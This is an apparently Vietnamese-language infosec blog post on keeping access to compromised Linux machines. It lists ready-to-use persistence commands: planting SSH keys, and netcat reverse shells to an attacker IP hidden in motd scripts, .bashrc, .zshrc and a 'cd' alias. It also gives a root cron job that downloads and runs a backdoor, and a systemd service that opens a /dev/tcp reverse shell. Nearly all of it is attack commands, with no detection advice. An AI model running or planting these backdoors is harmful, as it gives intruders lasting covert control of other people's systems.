+++
title = "Linux Backdoors"
description = ""
type = ["posts","post"]
tags = [
    "infosec",
    "linux",
]
date = "2021-06-28"
categories = [
    "infosec",
    "linux",
]
series = ["Linux"]
[ author ]
  name = "Quac Tran"
+++
Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell ...) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng. Ở đây chúng ta chỉ thảo luận trong thế giới Linux!
### Backdoor là gì?
Backdoor là một đoạn mã ẩn, script hay chương trình đặt trên máy mục tiêu phục vụ cho mục đích truy cập dài hạn vào mục tiêu của kẻ tấn công,với điều đó bạn không phải khai thác cùng một hệ thống hai lần. Nó chỉ đơn giản là cung cấp cho bạn quyền truy cập nhanh hơn và tức thì vào hệ thống.
### 1. SSH Keys
SSH authorized_keys tập tin chứa một danh sách các ủy quyền người dùng / khóa công khai được phép đăng nhập vào một tài khoản cụ thể. Trong tệp này, những kẻ tấn công cũng có thể đặt các khóa công khai của chúng để tự cấp quyền và truy cập ngay vào hệ thống thông qua SSH.\
#### Victim
`ssh-keygen -t rsa`\
-> generate key pair\
`cat /$(whoami)/.ssh/id_rsa.pub > /$(whoami)/.ssh/authorized_keys`\
-> copy public key (id_rsa.pub) to authorized_keys
#### Attacker
Copy private key (id_rsa)\
`chmod 600 id_rsa`\
-> set permission \
`ssh -i id_rsa username@victim`\
-> ssh to victim\
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG)
### 2. SSH motd
motd (Tin nhắn trong ngày) là banner xuất hiện khi bạn đăng nhập vào máy bằng SSH. Đối với Ubuntu / Debian các tập lệnh motd có thể được tìm thấy tại /etc/update-motd.d. Theo mặc định, những người dùng khác không có quyền ghi trên thư mục đó.
`cd /etc/update-motd.d && echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &' > 20-backdoor && chmod +x 20-backdoor`\
Lưu ý: & -> run command in background
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG)
### 3. User’s .bashrc — Interactive session
.bashrc là một trong những tập lệnh khởi động được sử dụng bởi Bourne shell bash (zsh là .zshrc). Nếu có người dùng sử dụng bashlàm trình bao đăng nhập của họ, thì tập lệnh sẽ được thực thi cho mỗi phiên tương tác mà họ khởi chạy.\
`cd && echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &' >> .bashrc`\
`cd && echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &' >> .zshrc`\
sẽ nhận được reverse shell khi người dùng sử dụng lệnh `bash` hay `su username`
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG)
### 4. User’s .bashrc — Aliases
Là một kẻ tấn công, chúng ta cũng có thể đặt backdoor trong bí danh của người dùng! Đây cũng là 1 phương pháp tôi rất thích.\
`alias cd='$(nc 192.168.66.105 4444 -e /bin/bash &); cd'`\
-> Chúng ta sẽ nhận được reverse shell mỗi khi người dùng sử dụng lệnh cd
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG)
Dưới đây là một số backdoor phức tạp khác sử dụng bí danh:
* [https://github.com/nisay759/sudo-backdoor](https://github.com/nisay759/sudo-backdoor)
* [https://gist.github.com/ahhh/1d4bf832c5a88cc75adb](https://gist.github.com/ahhh/1d4bf832c5a88cc75adb)
### 5. Cron jobs
Cron là một tính năng từ OS like Linux / UNIX có thể được sử dụng để thực hiện định kỳ một công việc hoặc nhiệm vụ cụ thể giống như Task Scheduler trong Windows.\
`echo '* * * * * root cd /tmp; wget 192.168.66.105:8000/backdoor && chmod +x backdoor && ./backdoor' > /etc/cron.d/backdoor`
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG)
### 6. Backdoor as a Service (BaaS)
Kẻ tấn công cũng có thể tạo một backdoor như một service (BaaS). Đây là một ví dụ về BaaS ( backdoor.service):
```bash
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.66.105/4444 0>&1"
[Install]
WantedBy=multi-user.target
```
Khi service được bắt đầu, nó khởi chạy một reverse shell cho kẻ tấn công.\
`cd /etc/systemd/system && systemctl start backdoor.service`\
Nó cũng có thể được kích hoạt khi enable.\
`cd /etc/systemd/system && systemctl enable backdoor.service`
![https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG)

